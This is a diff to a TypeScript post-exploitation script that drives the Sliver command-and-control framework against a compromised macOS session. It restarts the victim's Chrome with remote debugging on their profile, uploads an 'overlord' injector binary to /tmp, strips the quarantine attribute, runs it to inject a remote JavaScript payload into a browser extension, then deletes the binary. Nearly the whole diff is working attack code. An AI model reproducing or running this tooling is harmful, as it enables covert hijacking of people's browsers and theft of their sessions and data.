@@ -24,12 +24,11 @@ import * as readline from 'readline'
 import { ArgumentParser } from 'argparse';
 import { SliverClient, ParseConfigFile, InteractiveSession } from 'sliver-script'
 import { Session } from 'sliver-script/lib/pb/clientpb/client_pb'
-import { Execute } from 'sliver-script/lib/pb/sliverpb/sliver_pb'
+import { Upload } from 'sliver-script/lib/pb/sliverpb/sliver_pb';
 
 
 const DEBUG_PORT = 21099
-const EXTENSION_ID = 'cjpalhdlnbpafiamejdnhcphjbkeiagm'
-const CHROME_MACOS_HIJACK_PATH = "chrome-hijack"
+const MACOS_OVERLORD_AMD64 = "./bin/macos/overlord-amd64"
 const CHROME_MACOS_PATH = "/Applications/Google Chrome.app/Contents/MacOS/Google Chrome"
 
 // CLI Parser
@@ -37,8 +36,9 @@ const parser = new ArgumentParser({
   description: 'Inject Chrome Extensions into Chrome Extensions so you can extend the extensions',
   add_help: true,
 })
-parser.add_argument('--config', { required: true, help: 'path to config' })
+parser.add_argument('--config', { required: true, help: 'path to operator config' })
 parser.add_argument('--session', { required: true, type: Number, help: 'target session id' })
+parser.add_argument('--js-url', { required: true, type: Number, help: 'payload .js url' })
 const args = parser.parse_args()
 
 // ----------------------------------------------------------------------
@@ -82,6 +82,29 @@ async function findUserDataDir(session: Session, interact: InteractiveSession): 
   return null
 }
 
+function getChromePath(session: Session): string {
+  switch(session.getOs()) {
+    case 'darwin':
+      return CHROME_MACOS_PATH
+  }
+  return ''
+}
+
+function getInjectorPath(session: Session): string {
+  switch(session.getOs()) {
+
+    // MacOS
+    case 'darwin':
+      switch (session.getArch()) {
+        case 'amd64':
+          return MACOS_OVERLORD_AMD64
+      }
+      break
+      
+  }
+  return ''
+}
+
 async function prompt(msg: string): Promise<string> {
   return new Promise(resolve => {
     process.stdout.write(msg)
@@ -95,23 +118,6 @@ async function prompt(msg: string): Promise<string> {
       resolve(line)
     })
   })
-}
-
-function findDebugSocketFor(extensionId: string, curl: Execute): string|null {
-  try {
-    const debuggers = JSON.parse(curl.getResult())
-    for (let index = 0; index < debuggers.length; ++index) {
-      const context = debuggers[index]
-      const url = new URL(context.url)
-      if (url.hostname === extensionId) {
-        return context.webSocketDebuggerUrl
-      }
-    }
-    return null
-  } catch(err) {
-    console.error(`Failed to parse JSON response: ${err}`)
-    return null
-  }
 }
 
 function randomFileName(size: number = 6, prefix: string = ''): string {
@@ -140,7 +146,6 @@ if (fs.existsSync(args.config)) {
 
     const config = await ParseConfigFile(args.config)
     const client = new SliverClient(config)
-
     console.log(`Connecting to ${config.lhost} ...`)
     await client.connect()
 
@@ -149,7 +154,6 @@ if (fs.existsSync(args.config)) {
       console.log(`Session ${args.session} not found`)
       process.exit(0)
     }
-
     const interact = await client.interactWith(session)
     
     // Find UserDataDir
@@ -173,7 +177,8 @@ if (fs.existsSync(args.config)) {
     
     // Start Chrome with remote debugging enabled
     console.log('[*] Starting Chrome with remote debugging enabled ...')
-    await interact.execute(CHROME_MACOS_PATH, [
+    const chromePath = getChromePath(session)
+    await interact.execute(chromePath, [
       `--remote-debugging-port=${DEBUG_PORT}`,
       `--user-data-dir=${userDataDir}`,
       '--restore-last-session'
@@ -181,39 +186,42 @@ if (fs.existsSync(args.config)) {
 
     await sleep(750) // Wait for Chrome to init
 
-    // Find the websocket for the extension context we want to inject into
-    const curl = await interact.execute('curl', ['-s', `http://localhost:${DEBUG_PORT}/json`], true)
-    if (curl.getStatus() !== 0) {
-      console.error(`[!] Failed to curl debug port (exit ${curl.getStatus()})`)
-      process.exit(3)
-    }
-    const wsUrl = findDebugSocketFor(EXTENSION_ID, curl)
-    if (wsUrl === null) {
-      console.error(`[!] Could not find debug socket for: ${EXTENSION_ID}`)
-      process.exit(4)
-    }
-    console.log(`[*] Found target debug socket ${wsUrl}`)
-
-    // Upload payload - TODO: Load dylib in-memory
-    // TODO: MacOS only
     console.log(`[*] Uploading payload injector ...`)
-    if (!fs.existsSync(CHROME_MACOS_HIJACK_PATH)) {
-      console.error(`[!] Failed to load payload from: ${CHROME_MACOS_HIJACK_PATH}`)
+    const injectorPath = getInjectorPath(session)
+    if (!fs.existsSync(injectorPath)) {
+      console.error(`[!] Failed to load payload from: ${injectorPath}`)
       process.exit(5)
     }
-    const data = fs.readFileSync(CHROME_MACOS_HIJACK_PATH)
-    const upload = await interact.upload(`/tmp/${randomFileName()}`, data)
-    console.log('[*] Removing quarantine bit ...')
-    await interact.execute('chmod', ['+x', upload.getPath()], true)
-    await interact.execute('xattr', ['-r', '-d', 'com.apple.quarantine', upload.getPath()], true)
+    const injectorData = fs.readFileSync(injectorPath)
 
+    let upload: Upload|null = null
+    switch(session.getOs()) {
+
+      case 'darwin':
+        upload = await interact.upload(`/tmp/${randomFileName()}`, injectorData)
+        console.log('[*] Removing quarantine bit ...')
+        await interact.execute('chmod', ['+x', upload.getPath()], true)
+        await interact.execute('xattr', ['-r', '-d', 'com.apple.quarantine', upload.getPath()], true)   
+        break
+
+      // case 'linux':
+      //   upload = await interact.upload(`/tmp/${randomFileName()}`, injectorData)
+      //   await interact.execute('chmod', ['+x', upload.getPath()], true)
+      //   break
+
+    }
+ 
     console.log(`[*] Executing payload injector ...`)
-    const injection = await interact.execute(upload.getPath(), ['-remote', wsUrl], true)
+    const injection = await interact.execute(upload.getPath(), ['cursed', '--js-url', args.js_url], true)
 
     console.log('[*] Cleaning up ...')
     await interact.rm(upload.getPath())
 
-    console.log('[*] Successfully injected payload into target extension, good hunting!')
+    if (injection.getStatus() !== 0) {
+      console.log(`[!] Injector exit status ${injection.getStatus()}`)
+    } else {
+      console.log('[*] Successfully injected payload into target extension, good hunting!')
+    }
     process.exit(0)
 
   })();
